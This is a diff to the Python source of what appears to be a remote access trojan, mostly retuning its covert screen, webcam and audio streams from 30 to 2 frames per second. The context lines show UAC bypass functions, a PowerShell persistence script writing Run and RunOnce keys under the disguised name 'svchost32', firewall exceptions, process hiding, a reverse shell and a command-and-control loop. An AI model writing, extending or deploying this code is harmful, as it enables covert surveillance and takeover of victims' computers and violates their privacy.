@@ -788,7 +788,6 @@ def bypass_uac_fodhelper_protocol():
             
     except ImportError:
         return False
-
 def bypass_uac_computerdefaults():
     """UAC bypass using computerdefaults.exe registry manipulation."""
     if not WINDOWS_AVAILABLE:
@@ -2363,7 +2362,6 @@ def self_deploy_powershell():
         powershell_script = f'''
 $stealthPath = "{stealth_path}"
 $backupPath = "{backup_path}"
-
 # Add to registry
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "svchost32" /t REG_SZ /d $stealthPath /f
 reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "svchost32" /t REG_SZ /d $stealthPath /f
@@ -3162,7 +3160,6 @@ def add_firewall_exception():
     except Exception as e:
         log_message(f"[ERROR] Failed to add firewall exception: {e}")
         return False
-
 def hide_process():
     """Attempt to hide the current process from task manager."""
     if not WINDOWS_AVAILABLE:
@@ -3464,7 +3461,8 @@ def _stream_screen_fallback(agent_id):
                 monitors = sct.monitors
                 monitor_index = 1
                 log_message(f"Using monitor {monitor_index}: {monitors[monitor_index]}")
-                target_fps = 30
+                # Optimized for real-time monitoring: 2 FPS (0.5-second intervals)
+                target_fps = 2
                 frame_time = 1.0 / target_fps
                 last_frame_hash = None
                 frame_skip_count = 0
@@ -3495,7 +3493,7 @@ def _stream_screen_fallback(agent_id):
                     if not is_success:
                         continue
                     try:
-                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.1)
+                        response = requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                         if response.status_code != 200:
                             log_message(f"Warning: Server returned status {response.status_code}")
                     except requests.exceptions.Timeout:
@@ -3514,7 +3512,7 @@ def _stream_screen_fallback(agent_id):
 
 def stream_camera(agent_id):
     """
-    Captures the webcam and streams it to the controller at high FPS. Retry logic added.
+    Captures the webcam and streams it to the controller optimized for 0.5-second intervals (2 FPS) for real-time monitoring.
     """
     global CAMERA_STREAMING_ENABLED
     import time
@@ -3546,7 +3544,8 @@ def stream_camera(agent_id):
                 continue
             cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
             cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-            cap.set(cv2.CAP_PROP_FPS, 30)
+            # Optimized for real-time monitoring: 2 FPS (0.5-second intervals)
+            cap.set(cv2.CAP_PROP_FPS, 2)
             cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
             actual_width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
             actual_height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
@@ -3579,11 +3578,12 @@ def stream_camera(agent_id):
                         log_message(f"Camera stream request error: {e}. Retrying in {retry_delay}s...")
                         time.sleep(retry_delay)
                         break
-                    if frame_count % 30 == 0:
+                    if frame_count % 10 == 0:
                         elapsed = time.time() - start_time
                         fps = frame_count / elapsed
                         log_message(f"Camera streaming at {fps:.1f} FPS")
-                    time.sleep(1/30)
+                    # Sleep for 0.5 seconds for 2 FPS real-time monitoring
+                    time.sleep(0.5)
                 except Exception as e:
                     log_message(f"Camera stream error: {e}")
                     time.sleep(0.5)
@@ -3655,7 +3655,7 @@ def stream_audio(agent_id):
                     data = stream.read(CHUNK, exception_on_overflow=False)
                     frame_count += 1
                     try:
-                        response = requests.post(url, data=data, timeout=1)
+                        response = requests.post(url, data=data, timeout=0.5)
                         if response.status_code != 200:
                             log_message(f"Warning: Audio stream server returned status {response.status_code}")
                     except requests.exceptions.Timeout:
@@ -3896,7 +3896,6 @@ def stop_reverse_shell():
                 log_message(f"Warning: Could not join reverse shell thread: {e}")
         REVERSE_SHELL_THREAD = None
         log_message("Stopped reverse shell.")
-
 # --- Voice Control Functions ---
 
 def voice_control_handler(agent_id):
@@ -4001,6 +4000,7 @@ def stop_voice_control():
             VOICE_CONTROL_THREAD.join(timeout=2)
         VOICE_CONTROL_THREAD = None
         log_message("Stopped voice control.")
+
 # --- Remote Control Functions ---
 # Global variables for remote control
 REMOTE_CONTROL_ENABLED = False
@@ -4673,7 +4673,6 @@ def handle_live_audio(command_parts):
         return "Live audio processed successfully"
     except Exception as e:
         return f"Live audio processing failed: {e}"
-
 def execute_command(command):
     """Executes a command and returns its output."""
     try:
@@ -4708,6 +4707,7 @@ def execute_command(command):
             return "Bash not found. Command execution failed."
     except Exception as e:
         return f"Command execution failed: {e}"
+
 def main_loop(agent_id):
     """The main command and control loop."""
     # Initialize high-performance systems
@@ -5174,9 +5174,9 @@ except ImportError:
     HAS_XXHASH = False
 
 class HighPerformanceCapture:
-    """High-performance screen capture with hardware acceleration support"""
+    """High-performance screen capture optimized for real-time monitoring at 2 FPS (0.5-second intervals)"""
     
-    def __init__(self, target_fps: int = 60, quality: int = 85, 
+    def __init__(self, target_fps: int = 2, quality: int = 85, 
                  enable_delta_compression: bool = True):
         self.target_fps = target_fps
         self.frame_time = 1.0 / target_fps
@@ -5467,7 +5467,6 @@ class AdaptiveQualityManager:
         
         if new_quality != current_quality:
             self.capture.set_quality(new_quality)
-
 # ========================================================================================
 # LOW LATENCY INPUT MODULE
 # From: low_latency_input.py
@@ -6520,7 +6519,7 @@ def generate_video_frames(agent_id):
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
             else:
-                time.sleep(0.1)
+                time.sleep(0.5)
         except Exception as e:
             break
 
@@ -6533,7 +6532,7 @@ def generate_camera_frames(agent_id):
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
             else:
-                time.sleep(0.1)
+                time.sleep(0.5)
         except Exception as e:
             break
 
@@ -6545,7 +6544,7 @@ def generate_audio_stream(agent_id):
                 audio_data = agents_data[agent_id]['audio_frame']
                 yield audio_data
             else:
-                time.sleep(0.1)
+                time.sleep(0.5)
         except Exception as e:
             break
 
